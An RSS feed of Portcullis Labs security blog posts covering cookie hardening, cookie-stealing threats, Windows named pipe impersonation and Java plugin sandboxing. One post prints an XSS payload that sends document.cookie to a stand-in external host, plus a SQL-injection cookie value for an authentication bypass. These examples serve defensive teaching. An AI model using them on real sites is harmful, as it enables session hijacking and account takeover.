<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Portcullis Labs &#187; SDL</title>
	<atom:link href="https://labs.portcullis.co.uk/tag/sdl/feed/" rel="self" type="application/rss+xml" />
	<link>https://labs.portcullis.co.uk</link>
	<description>Research and Development</description>
	<language>en-US</language>
		<sy:updatePeriod>hourly</sy:updatePeriod>
		<sy:updateFrequency>1</sy:updateFrequency>
	<generator>http://wordpress.org/?v=3.8.5</generator>
	<item>
		<title>Keep your cookies safe (part 2)</title>
		<link>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/</link>
		<comments>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/#comments</comments>
		<pubDate>Thu, 15 Feb 2018 20:31:26 +0000</pubDate>
		<dc:creator><![CDATA[DMG]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3960</guid>
		<description><![CDATA[<p>In the first blog post we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why. How to read this post? The flowchart below will guide you to the process to check if [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>In the <a title="first blog post" href="/blog/keep-your-cookies-safe-part-1/">first blog post</a> we talked about the dangers that your cookies are exposed. Now it is time to keep your cookies safe. Time to know what protection mechanisms there are, how to use them and why.<span id="more-3960"></span></p>
<h2>How to read this post?</h2>
<p>The flowchart below will guide you to the process to check if your cookies are well protected. Note that there are more factors and cases that could potentially compromise your cookies (as we talked in the part 1 of the blog post).</p>
<p>Of course at the end of the post you will find the explanation to the flowchart. So if you do not understand anything, do not panic! Look for the question in the last part of the blog where it will be explained.</p>
<div id="attachment_3964" style="width: 466px" class="wp-caption aligncenter"><a name="imageclose-3961"><div class="lb-album"><a href="#image-3961"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookies_flowchart-456x1024.png" alt="flowchart about securing cookies" class="size-large wp-image-3964  "><span></span></a></div>              
<a href="#imageclose-3961" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-3961">
                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookies_flowchart.png" alt="image-3961">
                   </div></a><p class="wp-caption-text">A flowchart about how to get your cookies better secured.</p></div>
<h3>Is your session cookie different before and after login?</h3>
<ul>
<li>Correct answer: Yes, if your unique session ID cookie is different after and before login, your session is correctly protected against Session Fixation attacks</li>
<li>Incorrect answer: No, your unique session ID cookie is the same, if an attacker managed to stole your cookie before login into the web application, then once you are authenticated the attacker could also access the application</li>
</ul>
<p>Recommendation: Session ID should be changed after and before user logs in.</p>
<h3>Are you invalidating the session when the user logs out?</h3>
<ul>
<li>Correct answer: Yes, once the user has logged out, the session must be destroyed or invalidated</li>
<li>Incorrect answer: No, if you do not destroy the session ID in server side, the session will continue being valid</li>
</ul>
<p>Recommendation: Session must be invalidated after the user logs out.</p>
<h3>Does your cookie have the attribute &#8220;HttpOnly&#8221;?</h3>
<ul>
<li>Correct answer: Yes, your cookie is only accessible via http and not via JavaScript</li>
<li>Incorrect answer: No, your cookie is also accessible via JavaScript , which in case of an attacker compromise your application with a Cross-site Scripting, it could access to your cookie</li>
</ul>
<p>Recommendation: Set the cookie as &#8220;HttpOnly&#8221;.</p>
<h3>Does your cookie have the full domain attribute set?</h3>
<ul>
<li>Correct answer: Yes, your cookie is only being sent to the correct domain where it is needed</li>
<li>Incorrect answer: No, your cookie can be sent to the multiple sub-domains you could have</li>
</ul>
<p>Recommendation: The full domain of the cookie must be specified.</p>
<h3>Does your cookie have an adequate lifetime?</h3>
<ul>
<li>Correct answer: Yes</li>
<li>Incorrect answer: No, Cookies with an excessive lifetime will not be deleted when the user closes their browser and would therefore be exposed should an attacker manage to compromise the user&#8217;s system</li>
</ul>
<p>Recommendation: Use cookies without a lifetime so that they are deleted once the user closes their browser or lower its lifetime to meet business requirements.</p>
<h3>Do you have only one web application in the same domain?</h3>
<p>What does this question mean? The following is an example of multiple web applications in the same domain:</p>
<ul>
<li>www.mydomain.com/app1</li>
<li>www.mydomain.com/app2</li>
<li>www.mydomain.com/app3</li>
</ul>
<p>There is not a correct answer to this question.</p>
<p>If you only have one application running over the same domain, you should not need to care about this issue. However if you host multiple web applications, you need to set the attribute &#8220;path&#8221; of the cookie to ensure that the cookie is only being sent to the web application it belongs.</p>
<h3>Are your cookies NOT storing sensitive information?</h3>
<ul>
<li>Correct answer: Yes, my cookies do not contains sensitive information</li>
<li>Incorrect answer: No, there are some sensitive information in the cookies</li>
</ul>
<p>Recommendation: Ensure that sensitive information is not stored in the cookies.</p>
<h3>Does your web application support HTTPS?</h3>
<p>If the answer to this question is NO, you are sending all the data through a plain text protocol. An attacker able to intercept network traffic between a user&#8217;s session and the web server could capture the sensitive data being transmitted.</p>
<p>If the answer is YES, there is some other question you need to answer before know if you are protecting correctly your cookies:</p>
<h3>Does your web application use HTTP + HTTPS (mixed content)?</h3>
<p>If the answer is NO, it means that HTTP is not allowed and all the data is being sent over HTTPS. Although your cookie is secure in this case, you need to be careful if you enable HTTP.</p>
<p>If the answer is YES you need to answer one more question:</p>
<h3>Is HSTS (HTTP Strict Transport Security) enabled or has the cookie the attribute &#8220;secure&#8221;?</h3>
<p>If you have HSTS enabled, you are forcing all the data being sent over HTTPS (cookies included).</p>
<p>If the cookie has the attribute &#8220;secure&#8221;, you are forcing the cookie to be sent <strong>only</strong> over HTTPS.</p>
<p>Recommendation: Set the cookie as &#8220;secure&#8221; and consider to enable HSTS.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/">Keep your cookies safe (part 2)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-2/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Web Application Whitepaper</title>
		<link>https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/</link>
		<comments>https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/#comments</comments>
		<pubDate>Wed, 06 Sep 2017 11:12:46 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Whitepapers]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[HTML5]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6078</guid>
		<description><![CDATA[<p>This document aims to analyse and explore data collected from technical assurance engagements during 2016. The original piece of data analysis was performed by two of our interns (Daniel and Chris) as part of Cisco&#8217;s intended contribution to the next Top 10 publication from OWASP however due to time constraints, our data points were not [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/">Web Application Whitepaper</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>This document aims to analyse and explore data collected from technical assurance engagements during 2016.<span id="more-6078"></span></p>
<p>The original piece of data analysis was performed by two of our interns (Daniel and Chris) as part of Cisco&#8217;s intended contribution to the next Top 10 publication from OWASP however due to time constraints, our data points were not submitted. As a result, the co-authors (Simone and Isa) chose to compare the EMEAR team&#8217;s statistics from 2016 against the now public 2017 Top 10 published by OWASP. Additionally, they also took a look at the most common web application issues reported by the Team during the last year and analysed their impact and severity.</p>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/WAW.pdf" target="_blank" title="Download WAW"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="WAW" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/WAW.pdf" title="Download WAW.pdf" target="_blank" id="wpfb-file-link-1">WAW.pdf</a>
    
    <br />
    September 6, 2017<br />
    Version: 1.0<br />
  </div>
  <div class="info">
    925.6 KiB<br />
    MD5 hash: 0986d3ab7f6f55c71199296189ce5f62 <br />
    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>September 6, 2017</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/">Web Application Whitepaper</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/whitepapers/web-application-whitepaper/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Keep your cookies safe (part 1)</title>
		<link>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/</link>
		<comments>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/#comments</comments>
		<pubDate>Fri, 22 Apr 2016 15:03:32 +0000</pubDate>
		<dc:creator><![CDATA[DMG]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3605</guid>
		<description><![CDATA[<p>What are cookies and why are they important? A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>What are cookies and why are they important?<span id="more-3605"></span></p>
<p>A cookie is a small piece of data sent from a web site and stored in a user&#8217;s web browser and is subsequently includes with all authenticated requests that belong to that session. Some cookies contain the user session data in a web site, which is vital. Others cookies are used for tracking long-term records of an individuals browsing history and preferences such as their preferred language. Sometimes they are also used for tracking and monitoring a user&#8217;s activities across different web sites.</p>
<p>Due to the fact that HTTP is a stateless protocol, the web site needs a way to authenticate the user in each request. Every time the user visits a new page within a web site, the browser sends the users cookie back to the server, allowing the server to serve the correct data to that individual user, which is tracked using a session ID. Cookies therefore play an integral part in ensuring persistence of data used across multiple HTTP requests throughout the time a user visits a web site.</p>
<p>What does a cookie look like?</p>
<pre class="brush: php; gutter: false; title: ; notranslate">
Set-Cookie: __cfduid=d8a3ae94f81234321; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.domain.com; HttpOnly
</pre>
<p>The cookie below is an example of a common cookie generated for WordPress. Here we break down each part of the cookie and explain what it is used for:</p>
<ul>
<li>Set-Cookie &#8211; the web server asks the browser to save the cookie with this command</li>
<li>__cfduid=d8a3ae94f81234321;: This is the cookie itself. At the left of the equals symbol is the name of the cookie and to the right is its value</li>
<li>expires=Mon, 23-Dec-2019 23:50:00 GMT; &#8211; this is the date and time when the cookie will expire</li>
<li>path=/; domain=.domain.com; &#8211; the cookie domain and path define the scope of the cookie. They tell the browser that cookies should only be sent back to the server for the given domain and path</li>
<li>HttpOnly &#8211; this attribute (without a value associated) tells the browser that JavaScript cannot be used to access the cookie, which must only be accessed through HTTP or HTTPS. Sometimes you will also see the attribute &#8220;Secure&#8221;, which prevents the cookie being sent over the unencrypted HTTP protocol (i.e. the cookie will only be transmitted over HTTPS)</li>
</ul>
<p>What is the impact of having your cookies compromised?</p>
<p>A traditional and important role of a cookie is to store a users session ID, which is used to identify a user. If this type of cookie is stolen by a malicious user, they would be able to gain access to web site as the user for which the cookie belonged to (i.e. the malicoius user would have access to your account within the web site).</p>
<p>In the case of the tracking cookie, the malicious user would have access to your browsing history for the web site.</p>
<p>Another problem arises when sensitive data is stored in cookies, for example a username, and this is also a vector for server side exploitation if its contents are not properly validated, which can potentially lead to serious vulnerabilties such as SQL Injection or remote code execution.</p>
<p>What are the main cookie threats?</p>
<div id="attachment_3785" style="width: 310px" class="wp-caption aligncenter"><a href="http://www.flickr.com/photos/somegeekintn/" target="_blank"><img class="size-medium wp-image-3785  " title="Cookie Monster" alt="cookie monster image" src="https://labs.portcullis.co.uk/wp-content/uploads/2014/02/cookie_monster-300x198.jpg" width="300" height="198" /></a><p class="wp-caption-text">Cookie Monster.</p></div>
<p>There are different attacking vectors in which obtaining and modifying cookies can occur, leading to session hijacking of an authenticated user session, or even SQL injection attacks against the server. These threats may take place when an attacker takes control of the web browser using Cross-site Scripting, or Spyware, in order to obtain a users SessionID cookie that can then be used by an attacker to impersonate the legitimate user, as shown in the following example:</p>
<p>Obtaining access to the cookie can be as easy as using the following JavaScript line:</p>
<pre class="brush: jscript; gutter: false; title: ; notranslate">
document.cookie
</pre>
<p>Imagine that the web site has a search form that is vulnerable to Cross-site Scripting (Reflective Cross-site Scripting in this case). </p>
<pre class="brush: plain; gutter: false; title: ; notranslate">

http://myweb.com/form.php?search=XSS_PAYLOAD_HERE

</pre>
<p>An attacker could use the following payload to send the cookie to an external web site:</p>
<pre class="brush: xml; gutter: false; title: ; notranslate">
&amp;lt;script&amp;gt;location.href='http://external_web site.com/cookiemonster.php?c00kie='+escape(document.cookie);&amp;lt;/script&amp;gt;
</pre>
<p>The final step would be to send the vulnerable link to an admin and wait for them to click on it. If the attacker uses an URL shortener, this allows for further obfuscation of the malicous URL, as the admin will be unable to see the content of the link they have been sent.</p>
<p>An attacker able to read files from a given user may also attempt to retrieve the cookies stored in files from a system. Furthermore some browsers store  persistent cookies in a binary file that is easily readable with existing <a title="public tools" href="http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py">public tools</a>.</p>
<p>Security weaknesses may also reside server side when cookies are modified, if input validation routines are not adequately implemented. The example below shows how to bypass the authentication process:</p>
<pre class="brush: php; gutter: false; title: ; notranslate">
//In /core/user.php: (cs cart vulnerability)

if (fn_get_cookie(AREA_NAME . '_user_id')) {
 $udata = db_get_row(&quot;SELECT user_id, user_type, tax_exempt, last_login, membership_status, membership_id FROM $db_tables[users]
 WHERE user_id='&quot;.fn_get_cookies(AREA_NAME . '_user_id').&quot;' AND password='&quot;.fn_get_cookie(AREA_NAME . '_password').&quot;'&quot;);
 fn_define('LOGGED_VIA_COOKIE', true);

}

//Cookie: cs_cookies[customer_user_id]=1'/*;
</pre>
<p>For their role, cookies are really important and may be used in different attacks.</p>
<p>Now that you are more aware of the dangers, it would be wise to ensure steps are taken to deploy web site cookies safely and securely. Look out for the second part of this post!</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/">Keep your cookies safe (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/keep-your-cookies-safe-part-1/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Windows Named Pipes: There and back again</title>
		<link>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/</link>
		<comments>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/#comments</comments>
		<pubDate>Fri, 20 Nov 2015 14:04:20 +0000</pubDate>
		<dc:creator><![CDATA[ACD]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[Windows]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5378</guid>
		<description><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a means to exchange data between running processes in a semi-persistent manner.<span id="more-5378"></span></p>
<p>On Windows, named pipes operate in a server-client model and can make use of the Windows Universal Naming Convention (UNC) for both local and remote connections.</p>
<p>Named pipes on Windows use what is known as the Named Pipe File System (NPFS). The NPFS is a hidden partition which functions just like any other; files are written, read and deleted using the same mechanisms as a standard Windows file system. So named pipes are actually just files on a hard drive which persist until there are no remaining handles to the file, at which point the file is deleted by Windows.</p>
<p>The named pipe directory is located at: \\&lt;machine_address&gt;\pipe\&lt;pipe_name&gt;</p>
<p>There are many easy ways to read the contents of the local NPFS: Powershell, Microsoft SysInternals Process Explorer and Pipelist as well as numerous third party tools.</p>
<p>It&#8217;s also very easy to implement in a language such as C#, with a basic read all of the named pipes directory being as simple as:</p>
<pre class="brush: csharp; gutter: false; title: ; notranslate">
System.IO.Directory.GetFiles(@&quot;\\.\pipe\&quot;);
</pre>
<h2>Exploitation of named pipes</h2>
<p>Named pipes were introduced with NT and have been known to be vulnerable to a number of attacks over the years, especially once full support was adopted with Windows 2000. For example, the Service Control Manager (SCM) of Windows was discovered to be vulnerable to race conditions related to Named Pipes in 2000, more recently, a predictable named pipe used by Google Chrome could be exploited to help escape from the browser sandbox.</p>
<p>To date,the most common way to exploit named pipes to gain privileges on a system has been to abuse the impersonation token granted to the named pipe server to act on behalf of a connected client.</p>
<p>If the named pipe server is already running this is not particularly useful as we cannot create the primary server instance which clients will connect to, so it is generally required to preemptively create a named pipe server using the same name as the vulnerable service would normally create. This means that the user needs to know the name of the pipe before the vulnerable service is started and then wait for a client to connect. Ideal targets are services which run at administrator or SYSTEM level privileges, for the obvious reasons.</p>
<p>The problem with impersonation tokens begins when a client is running at a higher permission level than the server it is connecting to. If impersonation is allowed, the server can use the impersonation token to act on the client&#8217;s behalf.</p>
<p>The level of impersonation a server can perform depends on the level of consent a client provides. The client specifies a security quality of service (SQOS) when connecting to the server. The level of impersonation provided to the server by the SQOS can be one of the following four flags, which in the case of named pipes are provided as part of the connection process when calling the CreateFile function:</p>
<ul>
<li>SECURITY_ANONYMOUS &#8211; no impersonation allowed at all. The server cannot even identify the client</li>
<li>SECURITY_IDENTIFICATION &#8211; tmpersonation is not allowed, but the server can identify the client</li>
<li>SECURITY_IMPERSONATION &#8211; the client can be both identified and impersonated, but only locally (default)</li>
<li>SECURITY_DELEGATION &#8211; the client can be identified and impersonated, both locally and remotely</li>
</ul>
<p>When granted, impersonation tokens can be converted to primary security tokens with ease by calling the DuplicateTokenEx() function. From here it is just a matter of calling the CreateProcessAsUser() function to spawn a process (let’s say cmd.exe) using the new primary token which has the security context of the client.</p>
<p>Numerous Metasploit modules are available for exploiting named pipe vulnerabilities which have cropped up over the years. For example, the getsystem module in Metasploit makes use of named pipes to escalate to SYSTEM level privileges from Administrator.</p>
<p>Metasploit includes 2 different techniques which use named pipes to &#8216;get system&#8217;. The first one works by starting a named pipe server and then using administrator privileges to schedule a service to run as SYSTEM. This service connects as a named pipe client to the recently created server. The server impersonates the client and uses this to spawn a SYSTEM process for the meterpreter client.</p>
<p>The second technique is similar to the first, but instead a DLL is dropped to the hard drive which is then scheduled to run as SYSTEM, this technique is evidently not as clean as the first technique.</p>
<p>Thanks to Cristian Mikehazi for his prior research in to Metasploit&#8217;s getsystem module which made this section easier to write.</p>
<h2>Security considerations for Named Pipes / How to make safe pipes</h2>
<p>The security of named pipes is largely down to the developer and how they choose to implement the server and client sides of the application.</p>
<p>This is by no means an exhaustive list, but below details some of the good practices which should be considered whenever named pipes are to be deployed.</p>
<h3>Server side security</h3>
<p>The named pipe server is responsible for creating and managing a named pipe and its connected clients. Therefore, the most important element is to ensure that the named pipe server is indeed the correct server.</p>
<p>In this effect, there is an important flag which should be set when attempting to start new named pipe server: FILE_FLAG_FIRST_PIPE_INSTANCE.</p>
<p>By setting this flag it ensures that if the instance the server is attempting to create is not the first instance of the named pipe, it does not create the instance. In other words, it can give an indication as to whether another process has already created a named pipe server with this name and can allow for corrective action. This could be in the form of creating the server with an alternate name or stopping execution entirely.It is also a good idea that any intended clients are also made aware, if possible, that the server instance is not valid or has been changed so that they do not attempt to connect.</p>
<p>Further to this, creation of a named pipe server with a pseudo-randomly generated name can assist in ensuring any attempt by an attacker to preemptively create the server process will be unsuccessful. This is an approach the Google Chrome browser uses to help thwart unintended processes from creating the named pipe servers it uses for communication.</p>
<p>Another important server element is the maximum number of client instances allowed at any one time. If the maximum number of potential clients which will connect is known, a hard figure should be set to ensure that no further clients can connect. The flag which defines the maximum number of concurrent pipe instances is set as an integer value between 1 and 255 at invocation. To allow unlimited connections, the flag is set to PIPE_UNLIMITED_INSTANCES.</p>
<h3>Client side security</h3>
<p>Whenever a client pipe is under development, it is extremely important to consider carefully the level of privileges the pipe needs to do its job and to run it at the minimum level required.</p>
<p>The primary source of exploits against named pipes is through the  impersonation of client privileges by the named pipe server. The easiest and most direct way to prevent a named pipe client from being impersonated is disallow pipe impersonation when connecting to a server. This can be achieved by setting the SECURITY_IDENTIFICATION flag or the SECURITY_ANONYMOUS flag when calling the CreateFile() function as part of the client connection process.</p>
<p>In cases where impersonation is necessary, there are a number of other ways to ensure that only a legitimate client connects to a server. For example, in a simple application a specific sequence of information could be exchanged between the server and the client (a handshake) before any actual data is exchanged. For more advanced protection, encryption could be used. While not natively supported, public key cryptography (PKI) could be used if implemented correctly. These mechanisms are beyond the scope of this post but are worth bearing in mind.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Building a sandpit</title>
		<link>https://labs.portcullis.co.uk/blog/building-a-sandpit/</link>
		<comments>https://labs.portcullis.co.uk/blog/building-a-sandpit/#comments</comments>
		<pubDate>Tue, 18 Nov 2014 16:55:02 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Java]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[training]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1108</guid>
		<description><![CDATA[<p>Today I was looking at how plugins could safely be incorporated into a J2EE application server. The plugins in this instance are executed server side, rather than on the client and are, in the main, provided by 3rd parties (digital advertising agencies etc). The aim was to limit the scope in which they operate. The [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/building-a-sandpit/">Building a sandpit</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Today I was looking at how plugins could safely be incorporated into a J2EE application server. The plugins in this instance are executed server side, rather than on the client and are, in the main, provided by 3rd parties (digital advertising agencies etc). The aim was to limit the scope in which they operate. The implementation I looked at is pretty much the first instance where I&#8217;ve seen these techniques used, so I thought it was worth sharing.<span id="more-1108"></span></p>
<p>Let&#8217;s begin by enumerating the techniques can be used:</p>
<ul>
<li>Enforcement of code signing</li>
<li>Execution by a custom class loader</li>
<li>Use of a custom security manager</li>
<li>Execution under a custom policy</li>
</ul>
<p>The use of code signing by the JRE to secure it is most commonly used on applets that are deployed as part of a web application. In that context, Oracle use code signing to warn users about untrusted code and to limit the APIs that untrusted code can make use of. Of course, historically, this technique has been bypassed by luring users into accepting the untrusted code (these days Java will prompt even if code is signed and browsers often offer their own prompt too) and identifying flaws in the JRE which allow the untrusted code to call APIs that would otherwise be restricted. Whilst the latter is still a potential cause for concern, running untrusted in a J2EE application server won&#8217;t result in a popup that can be ignored, making this technique more far more effective.</p>
<p>However, in the case of an application running in a J2EE application server, this distinction between trusted and untrusted code is not typically present and all code is considered trusted. To enable the use of signed code, the developers therefore opted to make use of a custom class loader. The custom class loader they implemented extended the SecureClassLoader class, not just to enforce code signing as outlined above but also to limit where classes could be loaded from. Taking this approach, an malicious code would not only need to be correctly signed but would also need to have been deployed to a specific directory path. Further more attempts by plugin developers to load arbitrary bytecode, either from the JRE or from other untrusted sources could be reviewed and granted on a case by case basis. By doing so, the developers hoped to minimise the APIs that the plugins can make use of as well as limit the potential for an installed plugin to fetch and execute malicious code after it had been initially reviewed and found to be suitable for deployment.</p>
<p>An additional side effect of implementing a custom class loader as described is that it can be used in combination with a custom security manager to limit the APIs that the 3rd parties can call. The security manager is designed to determine whether any sensitive operation should be allowed. For example, it can limit access to files and network resources to prevent any unauthorised operations from occurring by mediating on behalf of the underlying JRE when such operations are attempted. The developers ensured that setSecurityManager() was called early with a custom security manager which overrode the default and implemented checkRead() etc in a restricted form. All in all, the custom security manager they wrote needed to implement checks for manipulation of the JVM (such as whether new custom class loaders are allowed), security managers (such as whether the custom class loader is allowed to instantiate a given class), system resources, threads, files and network resources.</p>
<p>Since bugs in the security manager (and access controllers present in later releases of the JRE) can be effectively exploited to gain access to privileged calls by untrusted code, the implementation called for an access controller where only a small subset of allowed operations were permitted. By doing so the developers were able to isolate one installed plugin&#8217;s ability to access resource that were only intended to be access that of other installed plugins. In particular, to complete the code signing protection checkAccess() was implemented to allow only a small set of trusted code signers.</p>
<p>Whilst the developers we worked with chose to implement their own security manager, I feel that there is benefit in discussing an alternate approach. Underneath the surface of the default access controller present within the JVM are a series of permissions which can be assigned or modified by the use of a custom security policy. Indeed, it would be possible to make use of these permissions within the developers custom security manager as an alternative to implementing the checks as code. In my mind, utilising a security policy is preferable since much of the complexity is abstracted away however it gives less fine grained access controls since you&#8217;re limited to the policy language as implemented within the JRE.</p>
<p>Remember that whilst privilege escalation vulnerabilities are relatively common in the JRE as a whole (hence the raft of remote code execution bugs we&#8217;ve seen with applets), what we&#8217;ve looked at here is a security in depth measure that can be applied to so-called trusted code supplied by a 3rd party developer that runs in a server environment. Thankfully, the threat actors in a position to exploit any bugs you may leave behind is significantly reduced.</p>
<p>In conclusion, the concepts I&#8217;ve touched on in this blog post are are quite complex and leave a fair degree of discretion to developers which may allow for vulnerabilities to be introduced. If you&#8217;re interested in implementing such a solutions, I would strongly recommend that you acquire a copy of <a title="Java Security" href="http://www.amazon.co.uk/Java-Security-Series-Scott-Oaks/">Java Security</a> which covers these and other concepts in far greater depth. Useful too, is the security research of <a title="Security Explorations" href="http://www.security-explorations.com/en/index.html">Security Explorations</a>, a Polish research company who have had a lot of fun with Java.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/building-a-sandpit/">Building a sandpit</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/building-a-sandpit/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>EMF Camp 2014 talk</title>
		<link>https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/</link>
		<comments>https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/#comments</comments>
		<pubDate>Thu, 28 Aug 2014 17:15:14 +0000</pubDate>
		<dc:creator><![CDATA[OMC]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[auditing]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[emfcamp2014]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[root]]></category>
		<category><![CDATA[SDL]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4646</guid>
		<description><![CDATA[<p>We recently announced our sponsorship of EMF Camp 2014, were ready to go Portcullis flags in tow and will be heading on over to Milton Keynes to help get EMF ready. While there we will not only be sponsoring the Lounge where people can come and enjoy a space to relax and drink beer and [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/emf-camp-2014-talk/">EMF Camp 2014 talk</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>We recently announced our sponsorship of EMF Camp 2014, were ready to go Portcullis flags in tow and will be heading on over to Milton Keynes to help get EMF ready.</p>
<p>While there we will not only be sponsoring the Lounge where people can come and enjoy a space to relax and drink beer and setting up Portcullis Village where people can visit us and exchange ideas but we will be having members of Portcullis hosting talks throughout the weekend.<span id="more-4646"></span></p>
<h2>How Many Bugs Can A Time Server Have? Friday 29th @ 14:00PM Stage B</h2>
<p>Portcullis members Tim Brown and Mike Emery will be talking about a number of new advisories to be released by Portcullis during the event including remote root in a network device. The attack surface area will be broken down, with the bugs in each area exposed. The impact of the finding as a whole will then be discussed, with the consequences potentially reaching far beyond the compromised device itself!</p>
